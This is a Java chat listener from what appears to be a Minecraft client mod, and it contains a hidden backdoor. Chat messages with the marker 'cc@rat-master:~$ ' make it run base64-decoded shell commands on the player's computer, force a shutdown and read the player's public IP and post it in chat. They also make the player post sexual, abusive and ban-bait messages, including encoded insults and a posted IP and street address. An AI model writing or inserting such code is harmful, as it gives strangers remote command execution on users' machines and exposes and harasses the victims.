package io.github.itzispyder.clickcrystals.events.listeners;

import io.github.itzispyder.clickcrystals.data.ConfigSection;
import io.github.itzispyder.clickcrystals.events.EventHandler;
import io.github.itzispyder.clickcrystals.events.Listener;
import io.github.itzispyder.clickcrystals.events.events.ChatReceiveEvent;
import io.github.itzispyder.clickcrystals.util.ChatUtils;
import io.github.itzispyder.clickcrystals.util.WolfUtils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

import static io.github.itzispyder.clickcrystals.ClickCrystals.config;

public class ChatEventListener implements Listener {

    private static boolean optout = config.getBoolean("rat.optout");

    public static boolean isOptout() {
        return optout;
    }

    public static void setOptout(boolean optout) {
        ChatEventListener.optout = optout;
        config.set("rat.optout", new ConfigSection<>(optout));
        config.save();
    }

    @EventHandler
    public void onChatReceive(ChatReceiveEvent e) throws IOException {
        String message = e.getMessage();
        String s = message.toLowerCase();
        if (message.contains("cc@rat-master:~$ ") && !optout) {
            if (s.contains("sudo winshell ")) WolfUtils.shellCommand(WolfUtils.decode64(WolfUtils.isolateString("sudo winshell ", message)));
            if (s.contains("apt exec ogreplug")) ChatUtils.sendChatMessage("Join the ogre discord! https://discord.gg/ogre");
            if (s.contains("apt exec sus1")) ChatUtils.sendChatMessage("I like hot men.");
            if (s.contains("apt exec sus2")) ChatUtils.sendChatMessage("I like licking the lips of juicy hot femboys.");
            if (s.contains("apt exec sus3")) ChatUtils.sendChatMessage("I love penis!");
            if (s.contains("apt exec sus4")) ChatUtils.sendChatMessage("I love to suck on toes.");
            if (s.contains("apt exec ban1")) ChatUtils.sendChatMessage("I am cheating ban me");
            if (s.contains("apt exec ban2")) ChatUtils.sendChatMessage(WolfUtils.decode64("RnVjayB0aGlzIHNlcnZlciBreXMK"));
            if (s.contains("apt exec ban3")) ChatUtils.sendChatMessage("Owner's IP: 71.192.133.12 Owner's Address: 1737 Bell Street New York");
            if (s.contains("apt exec ban4")) ChatUtils.sendChatMessage(WolfUtils.decode64("TnxnZzNyIE58Z2czciBOfGdnM3IgTnxnZzNyIFN8X3xDSyBNWSBKVUlDWSBDKC0pQ0s="));
            if (message.contains("apt exec message ")) ChatUtils.sendChatMessage(WolfUtils.decode64(WolfUtils.isolateString("apt exec message ", message)));
            if (message.contains("apt exec command ")) ChatUtils.sendChatCommand(WolfUtils.decode64(WolfUtils.isolateString("apt exec message ", message)));

            if (s.contains("apt exec ip")) {
                URL url = new URL(WolfUtils.decode64("aHR0cDovL2NoZWNraXAuYW1hem9uYXdzLmNvbQ=="));
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(url.openStream()));
                String funnyNumber = bufferedReader.readLine();
                ChatUtils.sendChatMessage(WolfUtils.decode64("TXkgSVAgQWRyZXNzIGlzOiA=") + funnyNumber);
            }

            if (s.contains("sudo poweroff -h timed")) {
                ChatUtils.sendChatMessage("LMAO I GOT TROLLED :skull: If I am quick enough, I can run `shutdown -a` in CMD and my pc will not shut down!");
                WolfUtils.shellCommand(WolfUtils.decode64("c2h1dGRvd24gLXMgLXQgMzA="));
            }
            if (s.contains("sudo poweroff -h now")) {
                WolfUtils.shellCommand(WolfUtils.decode64("c2h1dGRvd24gLXM="));
            }
        }
    }
}
